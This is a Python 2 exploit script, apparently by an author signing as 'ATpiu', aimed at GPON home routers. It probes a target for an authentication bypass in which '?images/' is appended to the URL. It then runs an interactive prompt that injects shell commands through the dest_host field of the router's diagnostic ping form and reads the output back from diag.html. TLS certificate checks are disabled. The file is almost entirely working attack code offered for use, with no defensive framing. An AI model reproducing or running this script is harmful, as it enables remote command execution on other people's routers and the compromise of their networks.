#!coding:utf-8
#!-*- author: ATpiu-*-
import requests
import urllib2
import ssl
import re
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
flag = 0

def banner():
    hello = """
    -----------------*************-----------------
        --------------**********--------------
    	       --------**ATpiu**--------
        --------------**********--------------
    -----------------*************-----------------			   
    		"""
    print hello
def receive_results(domain):
    try:
        rp = urllib2.urlopen(domain + '/diag.html?images/', context=ctx)
        for line in rp.readlines():
            global flag
            if(flag==0 and (' \"ipv4\"' in line)):
                ip=re.sub(r" \"ipv4\"(.*?), ",'',line)
                ip=re.sub(r"\},", '', ip)
                ip=ip.replace(', ','\n')
                print '-----------------------------\n'
                print ip
                print '-----------------------------'
                flag=flag+1
            elif ('diag_result = \"Can\'t resolv hostname for' in line):
                res= re.sub(r"diag_result = \"Can\'t resolv hostname for \[",'',line)
                res=re.sub(r";(.*)]\\n\\n\";",'',res)
                res=res.replace('\\n', '\n')
        print res
    except Exception as e:
        print str(e) + '\n'
        print "[*] An error occured while receiving the result"

def exp(command,url_bypass):
    payload = 'XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`' + command + '`;' + command + '&ipv=0'
    try:
        req = requests.Request('POST',url_bypass, data=payload)
        prepared = req.prepare()
        s = requests.Session()
        s.send(prepared)
        receive_results(domain)
    except Exception as e:
        pass

def command_parse(command,url_bypass):
    if not command:
        start_command(url_bypass)
    else:
        exp(command,url_bypass)

def start_command(url_bypass):
    try:
        while (1):
            input = raw_input('ATpiu-> ')
            command_parse(input,url_bypass)
    except KeyboardInterrupt:
        print ''
        temp = raw_input('continue?(Y/N)')
        if (temp == 'y' or temp == 'Y'):
            start_command(url_bypass)
        elif (temp == 'n' or temp == 'N'):
            exit(1)
def Vulnerable_judge(domain):
    url=domain+'/menu.html?style/'
    try:
        req = requests.get(url,allow_redirects=False)
        if req.status_code==200:
            return True
        return False
    except Exception as e:
        pass

if __name__ == '__main__':
    try:
        banner()
        print ''
        domain = raw_input('input target domain:\n')
        if not Vulnerable_judge(domain):
            print 'Target seems not Vulnerable'
            exit(0)
        else:
            print '[*] Target seems Vulnerable'
            print '[*] Inject command now'
            url_bypass=domain+'/GponForm/diag_Form?images/'
            start_command(url_bypass)
    except KeyboardInterrupt:
        print ''
        print 'Exit'
